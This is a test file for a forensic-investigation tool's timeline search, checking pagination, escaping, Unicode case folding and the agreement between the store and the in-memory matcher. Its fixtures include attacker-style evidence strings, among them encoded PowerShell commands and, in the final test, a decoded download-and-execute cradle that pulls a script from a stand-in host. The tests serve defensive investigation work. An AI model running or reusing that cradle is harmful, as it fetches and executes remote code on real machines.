import { describe, it, expect, beforeEach } from "vitest";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CaseStore } from "../../src/storage/caseStore.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { searchForensicTimeline, searchLikePattern } from "../../src/analysis/forensicSearch.js";
import { eventMatchesSearch } from "../../src/analysis/searchFilter.js";
import { emptyState } from "../../src/analysis/stateTypes.js";

let caseStore: CaseStore;
let stateStore: StateStore;

beforeEach(async () => {
  const root = await mkdtemp(join(tmpdir(), "dfir-search-"));
  caseStore = new CaseStore(root);
  await caseStore.createCase({ caseId: "c1", name: "n", investigator: "i", aiProvider: null });
  stateStore = new StateStore(caseStore);
});

// ---------------------------------------------------------------------------
// #928: server-side full-text search over the WHOLE forensic timeline.
//
// The dashboard fetches one page of at most 10,000 events and filters it in the browser, so on a
// larger case the matching evidence was never sent to the client at all — the analyst saw "no
// results" for an event that exists. Search has to be a query the store answers, not a filter over
// whatever happened to be loaded.
// ---------------------------------------------------------------------------
describe("searchForensicTimeline (#928)", () => {
  /** A case whose ONLY matching event sits far past any first page. */
  async function seedHaystack(matchAt: number, total: number) {
    const state = emptyState("c1");
    state.forensicTimeline = Array.from({ length: total }, (_, index) => ({
      id: `e${index}`,
      timestamp: `2026-01-01T00:00:${String(index % 60).padStart(2, "0")}.000Z`,
      description: index === matchAt ? "suspicious execution" : "routine logon",
      severity: "Low" as const,
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      asset: index === matchAt ? "TARGET01" : "HOST00",
      sources: ["Velociraptor"],
      ...(index === matchAt
        ? { message: "powershell.exe -enc TVqQAA cradle", commandLine: "powershell.exe -enc TVqQAA" }
        : {}),
    }));
    await stateStore.save(state);
  }

  it("finds a match that sits beyond the requested page", async () => {
    await seedHaystack(900, 1000);
    const page = await searchForensicTimeline(stateStore, "c1", "-enc", { limit: 50 });
    expect(page.entities.map((e) => e.id)).toEqual(["e900"]);
  });

  it("searches the full message and command line, not just the description", async () => {
    await seedHaystack(900, 1000);
    for (const term of ["cradle", "TVqQAA", "powershell.exe"]) {
      const page = await searchForensicTimeline(stateStore, "c1", term, { limit: 50 });
      expect(
        page.entities.map((e) => e.id),
        `term ${term}`,
      ).toEqual(["e900"]);
    }
  });

  it("reports the number of MATCHING events, not the case size", async () => {
    await seedHaystack(900, 1000);
    const page = await searchForensicTimeline(stateStore, "c1", "cradle");
    expect(page.total).toBe(1);
    const unfiltered = await stateStore.queryForensicTimeline("c1", { limit: 10 });
    expect(unfiltered.total).toBe(1000);
  });

  it("returns nothing for a term no event carries", async () => {
    await seedHaystack(900, 1000);
    const page = await searchForensicTimeline(stateStore, "c1", "mimikatz");
    expect(page.entities).toEqual([]);
    expect(page.total).toBe(0);
  });

  it("is case-insensitive", async () => {
    await seedHaystack(900, 1000);
    const page = await searchForensicTimeline(stateStore, "c1", "POWERSHELL.EXE");
    expect(page.entities.map((e) => e.id)).toEqual(["e900"]);
  });

  it("does not match JSON field NAMES in the stored payload", async () => {
    // The store keeps each event as a JSON blob, so a naive LIKE over the payload would match
    // "description" or "commandLine" on every row and hand the analyst the entire case.
    await seedHaystack(900, 1000);
    for (const term of ["description", "commandLine", "severity", "mitreTechniques"]) {
      const page = await searchForensicTimeline(stateStore, "c1", term);
      expect(page.entities, `term ${term}`).toEqual([]);
    }
  });

  it("combines with the existing structured filters", async () => {
    await seedHaystack(900, 1000);
    const hit = await searchForensicTimeline(stateStore, "c1", "cradle", { host: "TARGET01" });
    expect(hit.entities.map((e) => e.id)).toEqual(["e900"]);
    const miss = await searchForensicTimeline(stateStore, "c1", "cradle", { host: "HOST00" });
    expect(miss.entities).toEqual([]);
  });

  it("pages through many matches without losing or repeating an event", async () => {
    const state = emptyState("c1");
    state.forensicTimeline = Array.from({ length: 500 }, (_, index) => ({
      id: `e${index}`,
      timestamp: "2026-01-01T00:00:00.000Z",
      description: index % 5 === 0 ? "beacon callout" : "routine logon",
      severity: "Low" as const,
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      sources: [],
    }));
    await stateStore.save(state);

    const seen: string[] = [];
    let cursor: number | undefined;
    for (let guard = 0; guard < 20; guard++) {
      const page = await searchForensicTimeline(stateStore, "c1", "beacon", { limit: 30, cursor });
      seen.push(...page.entities.map((e) => e.id));
      if (page.nextCursor == null) break;
      cursor = page.nextCursor;
    }
    expect(seen).toHaveLength(100);
    expect(new Set(seen).size).toBe(100);
  });
});

describe("searchLikePattern", () => {
  it("escapes LIKE's own wildcards so they are searched literally", () => {
    expect(searchLikePattern("100%")).toBe("%100\\%%");
    expect(searchLikePattern("foo_bar")).toBe("%foo\\_bar%");
  });

  it("JSON-encodes first, because the pattern is matched against stored JSON text", () => {
    // One typed backslash is TWO characters in the payload, and each of those then needs LIKE's
    // own escape: a\b -> JSON a\\b -> pattern a\\\\b. Getting this wrong made every Windows
    // path search return nothing at all.
    expect(searchLikePattern("a\\b")).toBe("%a\\\\\\\\b%");
    expect(searchLikePattern('say "hi"')).toBe('%say \\\\"hi\\\\"%');
  });
  it("wraps a plain term untouched", () => {
    expect(searchLikePattern("certutil")).toBe("%certutil%");
  });
});

describe("searchForensicTimeline with a blank term", () => {
  it("falls through to the unfiltered query rather than matching nothing", async () => {
    const state = emptyState("c1");
    state.forensicTimeline = [
      {
        id: "e1",
        timestamp: "2026-01-01T00:00:00.000Z",
        description: "routine logon",
        severity: "Low",
        mitreTechniques: [],
        relatedFindingIds: [],
        sourceScreenshots: [],
        sources: [],
      },
    ];
    await stateStore.save(state);
    const page = await searchForensicTimeline(stateStore, "c1", "   ");
    expect(page.entities).toHaveLength(1);
  });
});

// The exact count is what makes a broad search expensive: measured on 100,000 events, a term
// matching every one of them took 13.6s with the count and 239ms without it, because counting
// parses every candidate payload. Past the ceiling the page says so instead of paying for it.
describe("searchForensicTimeline match count ceiling (#928)", () => {
  async function seedAllMatching(count: number) {
    const state = emptyState("c1");
    state.forensicTimeline = Array.from({ length: count }, (_, index) => ({
      id: `e${index}`,
      timestamp: "2026-01-01T00:00:00.000Z",
      description: "svchost.exe started",
      severity: "Low" as const,
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      sources: [],
    }));
    await stateStore.save(state);
  }

  it("counts exactly while the match count is below the ceiling", async () => {
    await seedAllMatching(1200);
    const page = await searchForensicTimeline(stateStore, "c1", "svchost", { limit: 10 });
    expect(page.total).toBe(1200);
    expect(page.totalIsLowerBound).toBeUndefined();
    expect(page.entities).toHaveLength(10);
  });

  it("still returns the requested page when the count is skipped", async () => {
    await seedAllMatching(1200);
    const page = await searchForensicTimeline(stateStore, "c1", "svchost", {
      limit: 10,
      includeTotal: false,
    });
    expect(page.entities).toHaveLength(10);
    expect(page.total).toBe(-1);
  });
});

// ---------------------------------------------------------------------------
// The prefilter runs against the raw STORED JSON while the predicate runs against the in-memory
// event. Anywhere those two disagree, the prefilter rejects a row the predicate would have
// accepted — and the analyst is told "no results" for evidence the case holds, which reads as
// proof of absence. Each of these was a real miss.
// ---------------------------------------------------------------------------
describe("searchForensicTimeline prefilter soundness (#928)", () => {
  async function seedOne(event: Record<string, unknown>) {
    const state = emptyState("c1");
    state.forensicTimeline = [
      {
        id: "e1",
        timestamp: "2026-01-01T00:00:00.000Z",
        description: "process created",
        severity: "Low" as const,
        mitreTechniques: [],
        relatedFindingIds: [],
        sourceScreenshots: [],
        sources: [],
        ...event,
      },
    ];
    await stateStore.save(state);
  }

  it("finds a Windows path typed with single backslashes", async () => {
    // JSON holds "C:\\Users\\bob", the analyst types "C:\Users\bob". A pattern built from the raw
    // term matched NOTHING for the most common search in Windows forensics.
    await seedOne({ path: "C:\\Users\\bob\\AppData\\Local\\Temp\\evil.exe" });
    for (const term of ["C:\\Users\\bob", "\\AppData\\Local", "Temp\\evil.exe"]) {
      const page = await searchForensicTimeline(stateStore, "c1", term);
      expect(
        page.entities.map((e) => e.id),
        `term ${term}`,
      ).toEqual(["e1"]);
    }
  });

  it("finds a term containing a double quote", async () => {
    await seedOne({ commandLine: 'rundll32.exe "C:\\temp\\a.dll",Start' });
    const page = await searchForensicTimeline(stateStore, "c1", '"C:\\temp\\a.dll"');
    expect(page.entities.map((e) => e.id)).toEqual(["e1"]);
  });

  it("finds a term containing a newline or tab", async () => {
    await seedOne({ message: "line one\nline two\tindented" });
    for (const term of ["one\nline", "two\tindented"]) {
      const page = await searchForensicTimeline(stateStore, "c1", term);
      expect(
        page.entities.map((e) => e.id),
        JSON.stringify(term),
      ).toEqual(["e1"]);
    }
  });

  it("keeps LIKE wildcards literal", async () => {
    await seedOne({ message: "disk 100% full and foo_bar present" });
    expect((await searchForensicTimeline(stateStore, "c1", "100%")).entities).toHaveLength(1);
    expect((await searchForensicTimeline(stateStore, "c1", "foo_bar")).entities).toHaveLength(1);
    // The wildcards must not match ACROSS text, or every term becomes "everything".
    expect((await searchForensicTimeline(stateStore, "c1", "disk%present")).entities).toHaveLength(0);
    expect((await searchForensicTimeline(stateStore, "c1", "foo_baz")).entities).toHaveLength(0);
  });

  it("agrees with the in-memory predicate rather than matching across two values", async () => {
    // The haystack used to be one joined string, so a term could straddle a description and an
    // asset that sit next to each other in no record at all. The predicate said yes and the store
    // said no; now neither does.
    await seedOne({ description: "svchost started", asset: "WKS1" });
    const page = await searchForensicTimeline(stateStore, "c1", "svchost started  wks1");
    expect(page.entities).toEqual([]);
    expect(
      eventMatchesSearch(
        { description: "svchost started", asset: "WKS1", mitreTechniques: [], sources: [] } as never,
        "svchost started  wks1",
      ),
    ).toBe(false);
  });

  it("does not let a canonical time describer match every event", async () => {
    // canonical.time carries precision "millisecond", clockConfidence "recorded", timezone "utc".
    // They describe the reading of the clock, not the event, and one typed word must not return
    // the whole case.
    await seedOne({ description: "process created" });
    for (const term of ["millisecond", "recorded", "utc"]) {
      const page = await searchForensicTimeline(stateStore, "c1", term);
      expect(page.entities, `term ${term}`).toEqual([]);
    }
  });
});

// SQL LIKE folds case for ASCII only; the matcher folds with toLowerCase(), which folds all of
// Unicode. Every case here matched in memory and returned nothing from the store — a "no results"
// that reads as proof of absence, for names an analyst has every reason to search in lower case.
describe("searchForensicTimeline unicode case folding (#928)", () => {
  async function seedPath(path: string) {
    const state = emptyState("c1");
    state.forensicTimeline = [
      {
        id: "e1",
        timestamp: "2026-01-01T00:00:00.000Z",
        description: "process created",
        severity: "Low" as const,
        mitreTechniques: [],
        relatedFindingIds: [],
        sourceScreenshots: [],
        sources: [],
        path,
      },
    ];
    await stateStore.save(state);
  }

  it("finds an accented path searched in lower case", async () => {
    await seedPath("C:\\Users\\José\\Téléchargements\\ÉVIL.exe");
    for (const term of ["évil.exe", "josé", "téléchargements"]) {
      const page = await searchForensicTimeline(stateStore, "c1", term);
      expect(
        page.entities.map((e) => e.id),
        `term ${term}`,
      ).toEqual(["e1"]);
    }
  });

  it("finds a Cyrillic account searched in lower case", async () => {
    await seedPath("CORP\\Администратор\\run.exe");
    const page = await searchForensicTimeline(stateStore, "c1", "администратор");
    expect(page.entities.map((e) => e.id)).toEqual(["e1"]);
  });

  it("still rejects a non-ASCII term the event does not carry", async () => {
    await seedPath("C:\\Users\\José\\ÉVIL.exe");
    const page = await searchForensicTimeline(stateStore, "c1", "Администратор");
    expect(page.entities).toEqual([]);
  });

  it("counts unicode matches, so the total is not a different answer from the page", async () => {
    await seedPath("C:\\Users\\José\\ÉVIL.exe");
    const page = await searchForensicTimeline(stateStore, "c1", "évil");
    expect(page.total).toBe(1);
  });

  it("an ascii term still finds an ascii event when the case also holds unicode rows", async () => {
    const state = emptyState("c1");
    state.forensicTimeline = [
      {
        id: "u1",
        timestamp: "2026-01-01T00:00:00.000Z",
        description: "café login",
        severity: "Low" as const,
        mitreTechniques: [],
        relatedFindingIds: [],
        sourceScreenshots: [],
        sources: [],
      },
      {
        id: "a1",
        timestamp: "2026-01-01T00:00:01.000Z",
        description: "certutil download",
        severity: "Low" as const,
        mitreTechniques: [],
        relatedFindingIds: [],
        sourceScreenshots: [],
        sources: [],
      },
    ] as never;
    await stateStore.save(state);
    expect((await searchForensicTimeline(stateStore, "c1", "certutil")).entities.map((e) => e.id)).toEqual([
      "a1",
    ]);
    expect((await searchForensicTimeline(stateStore, "c1", "CAFÉ")).entities.map((e) => e.id)).toEqual([
      "u1",
    ]);
  });
});

// Case folding is not closed over the ASCII boundary: U+212A KELVIN SIGN folds to plain "k". So a
// term can be non-ASCII as typed and pure ASCII once folded, and it then matches ASCII rows — which
// the non-ASCII GLOB prefilter, on its own, would never offer.
describe("searchForensicTimeline folding across the ASCII boundary (#928)", () => {
  it("finds a pure-ascii event from a term that only folds to ascii", async () => {
    const state = emptyState("c1");
    state.forensicTimeline = [
      {
        id: "e1",
        timestamp: "2026-01-01T00:00:00.000Z",
        description: "backup.exe launched",
        severity: "Low" as const,
        mitreTechniques: [],
        relatedFindingIds: [],
        sourceScreenshots: [],
        sources: [],
      },
    ];
    await stateStore.save(state);

    const kelvin = "bacÅup"; // folds to "bacåup" — stays non-ascii, must NOT match
    const foldsToAscii = "bacKup"; // U+212A KELVIN SIGN -> "backup"
    expect(foldsToAscii.toLowerCase()).toBe("backup");

    const hit = await searchForensicTimeline(stateStore, "c1", foldsToAscii);
    expect(hit.entities.map((e) => e.id)).toEqual(["e1"]);
    expect(hit.total).toBe(1);

    const miss = await searchForensicTimeline(stateStore, "c1", kelvin);
    expect(miss.entities).toEqual([]);
  });

  it("agrees with the in-memory matcher either way", async () => {
    const event = {
      id: "e1",
      timestamp: "2026-01-01T00:00:00.000Z",
      description: "backup.exe launched",
      severity: "Low" as const,
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      sources: [],
    };
    const state = emptyState("c1");
    state.forensicTimeline = [event];
    await stateStore.save(state);
    for (const term of ["bacKup", "BACKUP", "backup.exe", "bacÅup", "nope"]) {
      const page = await searchForensicTimeline(stateStore, "c1", term);
      expect(page.entities.length > 0, JSON.stringify(term)).toBe(eventMatchesSearch(event as never, term));
    }
  });
});

// ---------------------------------------------------------------------------
// THE INVARIANT, TESTED DIRECTLY.
//
// Three separate evidence-losing bugs shipped here, and all three were the same mistake: a SQL
// prefilter over STORED JSON standing in for a JS predicate over an IN-MEMORY object, with the two
// disagreeing at some seam — backslash escaping, Unicode case folding, folding that crosses the
// ASCII boundary. Each was found by someone else, because the tests kept checking the predicate
// that was designed rather than the gap between the two representations.
//
// So this asserts the property instead of another example: for every term, the store returns an
// event EXACTLY when the matcher accepts it. A prefilter that rejects a row the matcher would
// accept is silent evidence loss; one that lets extra rows through is merely slower. New nasty
// values and terms belong in these two lists, not in a new bespoke test.
// ---------------------------------------------------------------------------
describe("store and matcher agree on every event (#928)", () => {
  const VALUES = [
    "C:\\Users\\bob\\AppData\\Local\\Temp\\evil.exe",
    'rundll32.exe "C:\\temp\\a.dll",Start',
    "line one\nline two\tindented",
    "disk 100% full and foo_bar present",
    "C:\\Users\\José\\Téléchargements\\ÉVIL.exe",
    "CORP\\Администратор",
    "ΣΥΣΤΗΜΑ.EXE",
    "backup.exe launched",
    "STRASSE.log",
    "straße.log",
    "powershell.exe -enc SQBFAFgA",
    "plain ascii description",
    "mixed CaSe MiXeD",
    "emoji 🔥 in a filename.txt",
    "trailing space ",
  ];
  const TERMS = [
    "C:\\Users\\bob",
    "\\Temp\\",
    '"C:\\temp\\a.dll"',
    "one\nline",
    "two\tindented",
    "100%",
    "foo_bar",
    "foo_baz",
    "disk%full",
    "évil.exe",
    "ÉVIL",
    "josé",
    "администратор",
    "АДМИНИСТРАТОР",
    "σystημα",
    "ΣΥΣΤΗΜΑ",
    "bacKup",
    "bacÅup",
    "BACKUP",
    "strasse",
    "straße",
    "STRASSE",
    "-enc",
    "sqbefgxa",
    "ascii",
    "MIXED",
    "🔥",
    "trailing space ",
    "mimikatz",
    "",
  ];

  it("returns an event exactly when eventMatchesSearch accepts it", async () => {
    const state = emptyState("c1");
    state.forensicTimeline = VALUES.map((value, index) => ({
      id: `e${index}`,
      timestamp: "2026-01-01T00:00:00.000Z",
      description: value,
      severity: "Low" as const,
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      sources: [],
    }));
    await stateStore.save(state);

    // Compare against the events as the STORE hands them back — canonical envelope and all — since
    // that is precisely what the matcher sees in the dashboard.
    const all = await stateStore.queryForensicTimeline("c1", { limit: 1000 });

    for (const term of TERMS) {
      const expected = all.entities.filter((e) => eventMatchesSearch(e, term)).map((e) => e.id);
      const page = await searchForensicTimeline(stateStore, "c1", term, { limit: 1000 });
      expect(page.entities.map((e) => e.id).sort(), `term ${JSON.stringify(term)}`).toEqual(expected.sort());
      if (term) expect(page.total, `total for ${JSON.stringify(term)}`).toBe(expected.length);
    }
  }, 180_000);
});

// A floor is not a count. Reporting "10,000+" for a case with exactly 10,000 matches invents
// evidence that is not there; reporting "10,000" for one with more hides evidence that is.
describe("searchForensicTimeline lower-bound boundary (#928)", () => {
  async function seedMatching(count: number) {
    const state = emptyState("c1");
    state.forensicTimeline = Array.from({ length: count }, (_, index) => ({
      id: `e${index}`,
      timestamp: "2026-01-01T00:00:00.000Z",
      description: "beacon callout",
      severity: "Low" as const,
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
      sources: [],
    }));
    await stateStore.save(state);
  }

  it("reports an exact total when the matches land exactly on the ceiling", async () => {
    await seedMatching(10_000);
    const page = await searchForensicTimeline(stateStore, "c1", "beacon", { limit: 5 });
    expect(page.total).toBe(10_000);
    expect(page.totalIsLowerBound).toBeUndefined();
  }, 180_000);

  it("reports a lower bound only once a match past the ceiling exists", async () => {
    await seedMatching(10_001);
    const page = await searchForensicTimeline(stateStore, "c1", "beacon", { limit: 5 });
    expect(page.total).toBe(10_000);
    expect(page.totalIsLowerBound).toBe(true);
  }, 180_000);

  it("finds an event by its decoded payload through the store", async () => {
    const state = emptyState("c1");
    state.forensicTimeline = [
      {
        id: "e1",
        timestamp: "2026-01-01T00:00:00.000Z",
        description: "powershell.exe -enc SQBFAFgA",
        severity: "Low" as const,
        mitreTechniques: [],
        relatedFindingIds: [],
        sourceScreenshots: [],
        sources: [],
        deobfuscated: {
          decoded: "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1')",
          method: "powershell-enc",
          iocs: [],
        },
      },
    ];
    await stateStore.save(state);
    const page = await searchForensicTimeline(stateStore, "c1", "evil.test/a.ps1");
    expect(page.entities.map((e) => e.id)).toEqual(["e1"]);
    expect(page.total).toBe(1);
  });
});
